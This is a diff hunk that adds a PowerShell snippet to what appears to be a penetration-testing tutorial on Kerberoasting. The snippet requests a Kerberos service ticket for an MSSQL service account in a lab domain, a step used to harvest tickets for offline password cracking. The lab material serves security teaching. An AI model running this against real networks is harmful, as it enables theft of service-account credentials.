@@ -94,3 +94,8 @@ using PowerShell, we can request TGS tickets for an account in the shell above a
 
 #### Targeting a Single User
 
+```shell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
